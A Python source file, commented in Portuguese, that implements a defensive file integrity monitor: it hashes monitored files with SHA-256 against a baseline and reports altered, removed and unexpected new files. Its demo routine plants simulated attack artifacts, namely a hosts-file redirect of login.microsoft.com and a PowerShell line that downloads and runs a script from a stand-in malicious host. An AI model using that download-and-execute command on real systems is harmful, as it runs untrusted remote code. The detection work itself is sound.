"""
file_integrity_monitor.py
===========================
Monitora integridade de arquivos críticos via hash SHA-256: detecta quando um
arquivo monitorado foi alterado, removido, ou quando aparece um arquivo novo
não esperado numa pasta monitorada.

Complementa o Config Drift Detector (que olha serviços/registro/firewall) e
o Password Spray Detector (que olha logon), cobrindo o nível de arquivo —
esse é o padrão clássico de File Integrity Monitoring (FIM), presente em toda
ferramenta de compliance (PCI-DSS, CIS Controls) por um motivo: malware e
backdoors quase sempre tocam em arquivo em algum momento (binário substituído,
DLL nova, script de inicialização alterado).

FLUXO:
  1. capturar_baseline() -> calcula SHA-256 de cada arquivo monitorado, salva
  2. capturar_atual()    -> recalcula os hashes agora
  3. comparar()          -> alterado / removido / novo (não esperado)
  4. relatorio()         -> lista o que mudou, com severidade

Uso:
    python file_integrity_monitor.py --criar-baseline --caminhos C:\Windows\System32\drivers\etc\hosts,C:\Scripts
    python file_integrity_monitor.py --caminhos C:\Windows\System32\drivers\etc\hosts,C:\Scripts
    python file_integrity_monitor.py --demo
"""

import os
import sys
import json
import hashlib
import argparse
from datetime import datetime

BASELINE_FILE = os.path.join(os.path.dirname(__file__), "baseline_arquivos.json")

# Extensões ignoradas por padrão em pastas monitoradas (logs, temporários —
# mudam o tempo todo por natureza e gerariam ruído sem valor de segurança).
EXTENSOES_IGNORADAS = {".log", ".tmp", ".bak"}


# ----------------------------------------------------------------------------
# HASH E COLETA
# ----------------------------------------------------------------------------
def calcular_hash(caminho_arquivo: str) -> str:
    """SHA-256 do conteúdo do arquivo, lido em blocos (não carrega tudo na memória)."""
    sha256 = hashlib.sha256()
    with open(caminho_arquivo, "rb") as f:
        for bloco in iter(lambda: f.read(65536), b""):
            sha256.update(bloco)
    return sha256.hexdigest()


def listar_arquivos(caminhos: list[str]) -> list[str]:
    """Expande uma lista de caminhos (arquivos e/ou pastas) em uma lista plana de arquivos."""
    arquivos = []
    for caminho in caminhos:
        if os.path.isfile(caminho):
            arquivos.append(caminho)
        elif os.path.isdir(caminho):
            for raiz, _, nomes in os.walk(caminho):
                for nome in nomes:
                    if os.path.splitext(nome)[1].lower() in EXTENSOES_IGNORADAS:
                        continue
                    arquivos.append(os.path.join(raiz, nome))
        else:
            print(f"AVISO: caminho não encontrado, ignorando: {caminho}")
    return arquivos


def coletar_estado_atual(caminhos: list[str]) -> dict:
    estado = {}
    for arquivo in listar_arquivos(caminhos):
        try:
            estado[arquivo] = {
                "hash": calcular_hash(arquivo),
                "tamanho_bytes": os.path.getsize(arquivo),
                "modificado_em": datetime.fromtimestamp(os.path.getmtime(arquivo)).isoformat(timespec="seconds"),
            }
        except (PermissionError, FileNotFoundError) as erro:
            print(f"AVISO: não foi possível ler {arquivo}: {erro}")
    return {
        "coletado_em": datetime.now().isoformat(timespec="seconds"),
        "caminhos_monitorados": caminhos,
        "arquivos": estado,
    }


# ----------------------------------------------------------------------------
# DADOS DEMO
# ----------------------------------------------------------------------------
def _preparar_ambiente_demo(pasta: str) -> None:
    """Cria uma pastinha com arquivos de exemplo, para simular monitoramento real."""
    os.makedirs(pasta, exist_ok=True)
    with open(os.path.join(pasta, "hosts"), "w") as f:
        f.write("127.0.0.1 localhost\n192.168.1.10 servidor-interno\n")
    with open(os.path.join(pasta, "startup_script.ps1"), "w") as f:
        f.write("# Script de inicialização aprovado\nWrite-Host 'Sistema iniciado'\n")
    with open(os.path.join(pasta, "app_config.ini"), "w") as f:
        f.write("[geral]\nmodo=producao\ndebug=false\n")


def _modificar_ambiente_demo(pasta: str) -> None:
    """Simula 3 tipos de mudança: arquivo alterado, arquivo removido, arquivo novo."""
    # Alterado: alguém adicionou uma entrada de hosts suspeita (redirecionamento de domínio)
    with open(os.path.join(pasta, "hosts"), "w") as f:
        f.write("127.0.0.1 localhost\n192.168.1.10 servidor-interno\n203.0.113.99 login.microsoft.com\n")

    # Removido: startup_script.ps1 desaparece
    os.remove(os.path.join(pasta, "startup_script.ps1"))

    # Novo: arquivo não esperado aparece na pasta
    with open(os.path.join(pasta, "svchost_updater.ps1"), "w") as f:
        f.write("IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')\n")


# ----------------------------------------------------------------------------
# COMPARAÇÃO
# ----------------------------------------------------------------------------
def classificar_severidade(caminho: str, tipo_mudanca: str) -> str:
    nome = os.path.basename(caminho).lower()
    # Arquivo de hosts, scripts de inicialização e configs de app são sempre críticos
    if nome == "hosts" or "startup" in nome or nome.endswith((".ps1", ".bat", ".vbs")):
        return "CRITICO"
    if tipo_mudanca == "novo":
        return "ATENCAO"  # arquivo novo não monitorado antes: atenção até confirmar se é esperado
    return "ATENCAO"


def comparar(baseline: dict, atual: dict) -> list[dict]:
    achados = []
    arquivos_base = baseline["arquivos"]
    arquivos_atual = atual["arquivos"]

    # Alterados ou removidos
    for caminho, info_base in arquivos_base.items():
        info_atual = arquivos_atual.get(caminho)
        if info_atual is None:
            achados.append({
                "categoria": "arquivo_removido",
                "item": caminho,
                "severidade": classificar_severidade(caminho, "removido"),
                "detalhe": f"Arquivo presente no baseline não foi encontrado (removido ou movido).",
            })
        elif info_atual["hash"] != info_base["hash"]:
            achados.append({
                "categoria": "arquivo_alterado",
                "item": caminho,
                "severidade": classificar_severidade(caminho, "alterado"),
                "detalhe": (
                    f"Hash mudou. Tamanho: {info_base['tamanho_bytes']}B -> {info_atual['tamanho_bytes']}B. "
                    f"Modificado em: {info_atual['modificado_em']}."
                ),
            })

    # Novos (presentes agora, não estavam no baseline)
    for caminho in arquivos_atual:
        if caminho not in arquivos_base:
            achados.append({
                "categoria": "arquivo_novo",
                "item": caminho,
                "severidade": classificar_severidade(caminho, "novo"),
                "detalhe": "Arquivo não presente no baseline, apareceu na pasta monitorada.",
            })

    return achados


# ----------------------------------------------------------------------------
# RELATÓRIO
# ----------------------------------------------------------------------------
def imprimir_relatorio(achados: list[dict]) -> None:
    if not achados:
        print("Nenhuma alteração detectada. Integridade dos arquivos confere com o baseline. ✅")
        return

    criticos = [a for a in achados if a["severidade"] == "CRITICO"]
    atencao = [a for a in achados if a["severidade"] == "ATENCAO"]

    print(f"\n{'=' * 65}")
    print(f"ALTERAÇÕES DETECTADAS — {len(achados)} item(ns)")
    print(f"  {len(criticos)} crítico(s) | {len(atencao)} atenção")
    print(f"{'=' * 65}\n")

    for grupo, titulo in [(criticos, "CRÍTICO"), (atencao, "ATENÇÃO")]:
        if not grupo:
            continue
        print(f"--- {titulo} ---")
        for a in grupo:
            print(f"  [{a['categoria'].upper()}] {a['item']}")
            print(f"      {a['detalhe']}")
        print()


def salvar_relatorio_json(achados: list[dict], caminho: str) -> None:
    with open(caminho, "w", encoding="utf-8") as f:
        json.dump({
            "fonte": "file_integrity",
            "gerado_em": datetime.now().isoformat(timespec="seconds"),
            "total_achados": len(achados),
            "achados": achados,
        }, f, ensure_ascii=False, indent=2)


# ----------------------------------------------------------------------------
# ORQUESTRAÇÃO
# ----------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Monitora integridade de arquivos críticos via hash SHA-256.")
    parser.add_argument("--criar-baseline", action="store_true", help="Captura o estado atual dos arquivos como baseline aprovado.")
    parser.add_argument("--caminhos", help="Lista de arquivos/pastas separados por vírgula para monitorar.")
    parser.add_argument("--demo", action="store_true", help="Roda com um ambiente de arquivos simulado (cria pasta demo automaticamente).")
    parser.add_argument("--saida-json", default=None, help="Caminho para salvar o relatório em JSON (opcional).")
    args = parser.parse_args()

    if args.demo:
        pasta_demo = os.path.join(os.path.dirname(__file__), "pasta_monitorada_demo")
        caminhos = [pasta_demo]

        if args.criar_baseline:
            print(f"Preparando ambiente demo em: {pasta_demo}")
            _preparar_ambiente_demo(pasta_demo)
            baseline = coletar_estado_atual(caminhos)
            with open(BASELINE_FILE, "w", encoding="utf-8") as f:
                json.dump(baseline, f, ensure_ascii=False, indent=2)
            print(f"Baseline demo salvo em: {BASELINE_FILE}")
            print("Rode novamente com --demo (sem --criar-baseline) para ver as mudanças simuladas sendo detectadas.")
            return

        if not os.path.exists(BASELINE_FILE):
            print("Nenhum baseline demo encontrado — criando um agora automaticamente...")
            _preparar_ambiente_demo(pasta_demo)
            baseline = coletar_estado_atual(caminhos)
            with open(BASELINE_FILE, "w", encoding="utf-8") as f:
                json.dump(baseline, f, ensure_ascii=False, indent=2)

        with open(BASELINE_FILE, "r", encoding="utf-8") as f:
            baseline = json.load(f)

        print("Simulando alterações no ambiente demo (arquivo editado, removido e novo arquivo suspeito)...")
        _modificar_ambiente_demo(pasta_demo)
        atual = coletar_estado_atual(caminhos)

    else:
        if not args.caminhos:
            parser.error("Informe --caminhos (arquivos/pastas separados por vírgula) ou use --demo.")
        caminhos = [c.strip() for c in args.caminhos.split(",")]

        if args.criar_baseline:
            print("Capturando baseline dos caminhos informados...")
            baseline = coletar_estado_atual(caminhos)
            with open(BASELINE_FILE, "w", encoding="utf-8") as f:
                json.dump(baseline, f, ensure_ascii=False, indent=2)
            print(f"Baseline salvo em: {BASELINE_FILE} ({len(baseline['arquivos'])} arquivo(s))")
            return

        if not os.path.exists(BASELINE_FILE):
            sys.exit("ERRO: nenhum baseline encontrado. Rode primeiro com --criar-baseline.")
        with open(BASELINE_FILE, "r", encoding="utf-8") as f:
            baseline = json.load(f)
        atual = coletar_estado_atual(caminhos)

    achados = comparar(baseline, atual)
    imprimir_relatorio(achados)

    if args.saida_json:
        salvar_relatorio_json(achados, args.saida_json)
        print(f"Relatório salvo em: {args.saida_json}")


if __name__ == "__main__":
    main()